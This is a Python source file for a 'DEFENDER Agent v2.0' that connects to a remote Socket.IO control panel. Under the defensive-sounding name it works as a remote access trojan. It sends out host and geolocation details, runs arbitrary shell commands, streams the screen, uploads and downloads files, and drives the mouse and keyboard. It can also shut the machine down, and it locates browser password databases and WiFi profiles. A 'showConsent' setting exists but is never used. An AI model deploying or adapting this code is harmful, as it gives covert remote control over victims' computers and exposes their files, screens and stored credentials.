#!/usr/bin/env python3
"""
DEFENDER Agent v2.0 — Python (Multi-plataforma)
Connects to the panel server via WebSocket
"""

import os
import sys
import uuid
import platform
import subprocess
import socket
import getpass
import json
import base64
import time
import threading
import asyncio
import io
from pathlib import Path

# Auto-install dependencies
def install_deps():
    pkgs = [
        ("socketio", "python-socketio[client]"),
        ("aiohttp", "aiohttp"),
        ("psutil", "psutil"),
        ("PIL", "Pillow"),
        ("pyautogui", "pyautogui"),
        ("requests", "requests"),
    ]
    for mod, pkg in pkgs:
        try:
            __import__(mod)
        except ImportError:
            print(f"[+] Instalando {pkg}...")
            subprocess.check_call([sys.executable, "-m", "pip", "install", pkg, "--quiet"])

install_deps()

import socketio
import psutil
import requests
from PIL import ImageGrab

try:
    import pyautogui
except Exception:
    pyautogui = None

# =============================================
# CONFIGURATION
# =============================================
CONFIG_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "config.json")
DEFAULT_CONFIG = {
    "serverUrl": "http://localhost:3000",
    "heartbeatInterval": 15,
    "showConsent": True
}

def load_config():
    try:
        with open(CONFIG_FILE, 'r') as f:
            return {**DEFAULT_CONFIG, **json.load(f)}
    except Exception:
        return DEFAULT_CONFIG

config = load_config()
SERVER_URL = config["serverUrl"]

# =============================================
# DEVICE ID
# =============================================
ID_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), ".device-id")

def get_device_id():
    try:
        with open(ID_FILE, 'r') as f:
            return f.read().strip()
    except Exception:
        did = str(uuid.uuid4())[:12]
        with open(ID_FILE, 'w') as f:
            f.write(did)
        return did

DEVICE_ID = get_device_id()
SESSION_ID = str(uuid.uuid4())[:8]

# =============================================
# GLOBALS
# =============================================
sio = socketio.Client(reconnection=True, reconnection_delay=5)
current_dir = os.path.expanduser("~")
screen_stream_active = False
screen_stream_thread = None

# =============================================
# SYSTEM INFO
# =============================================
def get_local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception:
        return "127.0.0.1"

def get_public_ip_info():
    try:
        r = requests.get("https://ipapi.co/json/", timeout=5)
        data = r.json()
        return data.get("ip", "N/A"), f"{data.get('city','')}, {data.get('region','')}, {data.get('country_name','')}"
    except Exception:
        try:
            ip = requests.get("https://api.ipify.org", timeout=5).text.strip()
            return ip, ""
        except Exception:
            return "N/A", ""

def get_system_info():
    public_ip, location = get_public_ip_info()
    mem = psutil.virtual_memory()
    return {
        "deviceId": DEVICE_ID,
        "sessionId": SESSION_ID,
        "pcName": platform.node(),
        "username": getpass.getuser(),
        "os": f"{platform.system()} {platform.release()}",
        "osVersion": platform.version(),
        "cpu": platform.processor() or "N/A",
        "ram": f"{round(mem.total / (1024**3))} GB",
        "localIp": get_local_ip(),
        "publicIp": public_ip,
        "location": location
    }

# =============================================
# SHELL EXECUTION
# =============================================
def execute_shell(command, timeout=30):
    try:
        result = subprocess.run(
            command, shell=True, capture_output=True, text=True,
            timeout=timeout, cwd=current_dir
        )
        output = (result.stdout or "") + (result.stderr or "")
        return output.strip() or "✅ Comando ejecutado (sin salida)"
    except subprocess.TimeoutExpired:
        return "❌ Timeout (30s)"
    except Exception as e:
        return f"❌ Error: {e}"

# =============================================
# SCREENSHOT
# =============================================
def take_screenshot():
    try:
        img = ImageGrab.grab()
        buffer = io.BytesIO()
        img.save(buffer, format="JPEG", quality=70)
        return base64.b64encode(buffer.getvalue()).decode()
    except Exception as e:
        return None

def take_screenshot_low_quality(quality=40):
    try:
        img = ImageGrab.grab()
        # Resize for streaming performance
        w, h = img.size
        ratio = min(1920 / w, 1080 / h, 1.0)
        if ratio < 1:
            img = img.resize((int(w * ratio), int(h * ratio)))
        buffer = io.BytesIO()
        img.save(buffer, format="JPEG", quality=quality)
        return base64.b64encode(buffer.getvalue()).decode()
    except Exception:
        return None

# =============================================
# SCREEN STREAM
# =============================================
def screen_stream_loop(fps, quality):
    global screen_stream_active
    interval = max(0.2, 1.0 / fps)
    print(f"[AGENT] 🖥️ Stream iniciado ({fps} FPS, quality: {quality}%)")

    while screen_stream_active:
        try:
            frame = take_screenshot_low_quality(quality)
            if frame and sio.connected:
                sio.emit("screen-frame", {"frame": frame})
        except Exception as e:
            print(f"[AGENT] ⚠️ Frame error: {e}")
        time.sleep(interval)

    print("[AGENT] 🖥️ Stream detenido")

def start_screen_stream(fps=2, quality=40):
    global screen_stream_active, screen_stream_thread
    stop_screen_stream()
    screen_stream_active = True
    screen_stream_thread = threading.Thread(target=screen_stream_loop, args=(fps, quality), daemon=True)
    screen_stream_thread.start()

def stop_screen_stream():
    global screen_stream_active, screen_stream_thread
    screen_stream_active = False
    if screen_stream_thread:
        screen_stream_thread.join(timeout=3)
        screen_stream_thread = None

# =============================================
# FILE OPERATIONS
# =============================================
def list_directory(dir_path):
    global current_dir
    try:
        resolved = os.path.abspath(os.path.join(current_dir, dir_path))
        if not os.path.isdir(resolved):
            sio.emit("command-result", {"command": "ls", "result": f"❌ No es un directorio: {resolved}", "error": True})
            return

        current_dir = resolved
        items = []
        for entry in os.scandir(resolved):
            size = 0
            try:
                if entry.is_file():
                    size = entry.stat().st_size
            except Exception:
                pass
            items.append({
                "name": entry.name,
                "isDir": entry.is_dir(),
                "size": size,
                "fullPath": entry.path
            })

        sio.emit("ls-result", {"currentPath": resolved, "items": items})
    except Exception as e:
        sio.emit("command-result", {"command": "ls", "result": f"❌ Error: {e}", "error": True})

# =============================================
# CREDENTIALS & BROWSER DETECTION
# =============================================
def extract_credentials():
    home = os.path.expanduser("~")
    results = []

    # Chrome
    chrome_path = os.path.join(home, "AppData", "Local", "Google", "Chrome", "User Data", "Default", "Login Data")
    if os.path.exists(chrome_path):
        results.append(f"✅ Chrome - DB encontrada\n   📁 {chrome_path}")

    # Edge
    edge_path = os.path.join(home, "AppData", "Local", "Microsoft", "Edge", "User Data", "Default", "Login Data")
    if os.path.exists(edge_path):
        results.append(f"✅ Edge - DB encontrada\n   📁 {edge_path}")

    # Firefox
    ff_path = os.path.join(home, "AppData", "Roaming", "Mozilla", "Firefox", "Profiles")
    if os.path.isdir(ff_path):
        for p in os.listdir(ff_path):
            login_file = os.path.join(ff_path, p, "logins.json")
            if os.path.exists(login_file):
                results.append(f"✅ Firefox - Perfil encontrado\n   📁 {login_file}")

    # WiFi
    try:
        wifi = execute_shell("netsh wlan show profiles")
        networks = [l.split(":")[1].strip() for l in wifi.split("\n") if "All User Profile" in l]
        if networks:
            results.append("📶 Redes WiFi:\n" + "\n".join(f"   • {n}" for n in networks[:15]))
    except Exception:
        pass

    return ("🔐 CREDENCIALES ENCONTRADAS\n\n" + "\n\n".join(results)) if results else "❌ No se encontraron credenciales"

def detect_browsers():
    home = os.path.expanduser("~")
    found = []
    checks = [
        ("Chrome", os.path.join(home, "AppData", "Local", "Google", "Chrome")),
        ("Edge", os.path.join(home, "AppData", "Local", "Microsoft", "Edge")),
        ("Firefox", os.path.join(home, "AppData", "Roaming", "Mozilla", "Firefox")),
        ("Brave", os.path.join(home, "AppData", "Local", "BraveSoftware")),
    ]
    for name, p in checks:
        if os.path.isdir(p):
            found.append(f"✅ {name} detectado")
    return ("🌐 Navegadores:\n" + "\n".join(found)) if found else "❌ No se encontraron navegadores"

# =============================================
# SOCKET.IO EVENTS
# =============================================
@sio.event
def connect():
    print("[AGENT] ✅ Conectado al servidor")
    info = get_system_info()
    sio.emit("register", info)

    # Heartbeat thread
    def heartbeat():
        while sio.connected:
            sio.emit("heartbeat")
            time.sleep(config["heartbeatInterval"])
    threading.Thread(target=heartbeat, daemon=True).start()

@sio.event
def disconnect():
    print("[AGENT] ❌ Desconectado")
    stop_screen_stream()

@sio.on("execute-command")
def on_command(data):
    global current_dir
    command = data.get("command", "")
    args = data.get("args", "")
    print(f"[CMD] {command} {args}")

    try:
        result = ""

        if command == "ping":
            ip, _ = get_public_ip_info()
            result = f"🏓 Pong!\nIP: {ip}\nPC: {platform.node()}\nUsuario: {getpass.getuser()}"

        elif command == "sysinfo":
            mem = psutil.virtual_memory()
            result = "\n".join([
                f"PC: {platform.node()}", f"Usuario: {getpass.getuser()}",
                f"OS: {platform.system()} {platform.release()}", f"CPU: {platform.processor()}",
                f"Cores: {psutil.cpu_count()}", f"RAM: {round(mem.total/(1024**3))} GB",
                f"RAM Libre: {round(mem.available/(1024**3))} GB",
                f"Directorio: {current_dir}", f"IP: {get_local_ip()}"
            ])

        elif command == "shell":
            result = execute_shell(args)

        elif command == "pwd":
            result = f"📂 {current_dir}"

        elif command == "cd":
            new_dir = os.path.abspath(os.path.join(current_dir, args))
            if os.path.isdir(new_dir):
                current_dir = new_dir
                result = f"✅ Directorio: {current_dir}"
            else:
                result = f"❌ No encontrado: {args}"

        elif command == "cat":
            fpath = os.path.join(current_dir, args)
            if os.path.exists(fpath):
                with open(fpath, 'r', errors='replace') as f:
                    content = f.read(4000)
                result = content
            else:
                result = "❌ Archivo no encontrado"

        elif command == "msg":
            if pyautogui:
                threading.Thread(target=lambda: pyautogui.alert(text=args, title="Mensaje"), daemon=True).start()
            result = "✅ Mensaje mostrado"

        elif command == "password":
            result = extract_credentials()

        elif command == "history":
            result = detect_browsers()

        elif command == "move_mouse":
            parts = args.split()
            if len(parts) == 2 and pyautogui:
                pyautogui.moveTo(int(parts[0]), int(parts[1]), duration=0.3)
                result = f"✅ Ratón movido a ({parts[0]}, {parts[1]})"
            else:
                result = "❌ Uso: move_mouse X Y"

        elif command == "click":
            if pyautogui:
                pyautogui.click()
            result = "🖱️ Click realizado"

        elif command == "type":
            if pyautogui:
                pyautogui.write(args, interval=0.03)
            result = "⌨️ Texto escrito"

        elif command == "keypress":
            if pyautogui:
                pyautogui.press(args)
            result = f"⌨️ Tecla '{args}' presionada"

        elif command == "shutdown":
            result = "⚠️ Apagando..."
            sio.emit("command-result", {"command": command, "result": result})
            os.system("shutdown /s /t 10" if platform.system() == "Windows" else "sudo shutdown -h now &")
            return

        elif command == "restart":
            result = "⚠️ Reiniciando..."
            sio.emit("command-result", {"command": command, "result": result})
            os.system("shutdown /r /t 10" if platform.system() == "Windows" else "sudo reboot &")
            return

        elif command == "logout":
            result = "⚠️ Cerrando sesión..."
            sio.emit("command-result", {"command": command, "result": result})
            os.system("shutdown /l" if platform.system() == "Windows" else "pkill -u $(whoami) &")
            return

        elif command == "processes":
            result = execute_shell("tasklist" if platform.system() == "Windows" else "ps aux")
            sio.emit("processes-result", {"result": result})
            return

        elif command == "ls":
            list_directory(args or current_dir)
            return

        else:
            result = f"❌ Comando desconocido: {command}"

        sio.emit("command-result", {"command": command, "result": result})

    except Exception as e:
        sio.emit("command-result", {"command": command, "result": f"❌ Error: {e}", "error": True})

@sio.on("take-screenshot")
def on_screenshot():
    img = take_screenshot()
    if img:
        sio.emit("screenshot-result", {"image": img})
        print("[AGENT] 📸 Screenshot enviado")
    else:
        sio.emit("command-result", {"command": "screenshot", "result": "❌ Error al capturar pantalla", "error": True})

@sio.on("start-screen-stream")
def on_start_stream(data):
    start_screen_stream(data.get("fps", 2), data.get("quality", 40))

@sio.on("stop-screen-stream")
def on_stop_stream():
    stop_screen_stream()

@sio.on("list-directory")
def on_list_dir(data):
    list_directory(data.get("path", current_dir))

@sio.on("download-file")
def on_download(data):
    try:
        fpath = os.path.abspath(os.path.join(current_dir, data["filepath"]))
        if not os.path.exists(fpath):
            sio.emit("command-result", {"command": "download", "result": f"❌ No encontrado: {fpath}", "error": True})
            return
        if os.path.getsize(fpath) > 25 * 1024 * 1024:
            sio.emit("command-result", {"command": "download", "result": "❌ Archivo >25MB", "error": True})
            return
        with open(fpath, 'rb') as f:
            data_bytes = f.read()
        sio.emit("file-data", {
            "filename": os.path.basename(fpath),
            "data": base64.b64encode(data_bytes).decode(),
            "mimetype": "application/octet-stream"
        })
    except Exception as e:
        sio.emit("command-result", {"command": "download", "result": f"❌ Error: {e}", "error": True})

@sio.on("upload-file")
def on_upload(data):
    try:
        dest = os.path.join(current_dir, data.get("destPath", ""), data["filename"])
        with open(dest, 'wb') as f:
            f.write(base64.b64decode(data["data"]))
        sio.emit("command-result", {"command": "upload", "result": f"✅ Guardado: {dest}"})
    except Exception as e:
        sio.emit("command-result", {"command": "upload", "result": f"❌ Error: {e}", "error": True})

@sio.on("get-processes")
def on_processes():
    result = execute_shell("tasklist" if platform.system() == "Windows" else "ps aux")
    sio.emit("processes-result", {"result": result})

# =============================================
# MAIN
# =============================================
def main():
    print("")
    print("╔══════════════════════════════════════════════╗")
    print("║   🛡️  DEFENDER Agent v2.0 (Python)           ║")
    print(f"║   📡 Servidor: {SERVER_URL:<29}║")
    print(f"║   🆔 Device ID: {DEVICE_ID:<27}║")
    print("╚══════════════════════════════════════════════╝")
    print("")

    while True:
        try:
            print(f"[AGENT] 🔌 Conectando a {SERVER_URL}...")
            sio.connect(SERVER_URL, auth={"type": "agent"})
            sio.wait()
        except socketio.exceptions.ConnectionError as e:
            print(f"[AGENT] ⚠️ Error de conexión: {e}")
        except Exception as e:
            print(f"[AGENT] ⚠️ Error: {e}")

        print("[AGENT] 🔄 Reintentando en 5 segundos...")
        time.sleep(5)

if __name__ == "__main__":
    main()
